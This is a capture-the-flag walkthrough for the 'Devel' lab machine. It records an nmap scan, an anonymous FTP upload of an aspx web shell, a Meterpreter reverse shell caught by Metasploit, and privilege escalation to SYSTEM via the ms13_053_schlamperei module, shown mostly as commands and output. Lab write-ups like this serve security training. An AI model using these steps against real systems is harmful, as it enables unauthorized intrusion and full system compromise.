## Devel

__Machine IP: 10.10.10.5__
__Difficulty :  Easy__

## Scanning

### Nmap Sccaning

```bash
$ cat nmap/devel.nmap                                                6 ⚙
# Nmap 7.91 scan initiated Mon Sep  6 05:19:03 2021 as: nmap -sC -sV -oA nmap/devel 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.099s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  6 05:19:21 2021 -- 1 IP address (1 host up) scanned in 18.68 seconds

```

## Enumeration

- Login with `ftp` (anonymous login allowed) and place `aspx` shell
```bash
$ ftp 10.10.10.5    
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
09-06-21  12:35PM                 2901 shell.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

- setup listener on metasploit

> Make sure to setup the payload

__Result__

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.12:4444 -> 10.10.10.5:49161) at 2021-09-06 05:33:04 -0400

meterpreter > sessions -l
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > getuid
Server username: IIS APPPOOL\Web

```


## Escalation

- use `exploit suggestor` and try all. the following works

```bash
msf6 exploit(windows/local/ms13_053_schlamperei) > set session 2
session => 2
msf6 exploit(windows/local/ms13_053_schlamperei) > show options

Module options (exploit/windows/local/ms13_053_schlamperei):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1


msf6 exploit(windows/local/ms13_053_schlamperei) > set lhost tun2
lhost => tun2
msf6 exploit(windows/local/ms13_053_schlamperei) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Launching notepad to host the exploit...
[+] Process 4084 launched.
[*] Reflectively injecting the exploit DLL into 4084...
[*] Injecting exploit into 4084...
[*] Found winlogon.exe with PID 472
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.12:4444 -> 10.10.10.5:49162) at 2021-09-06 05:41:33 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```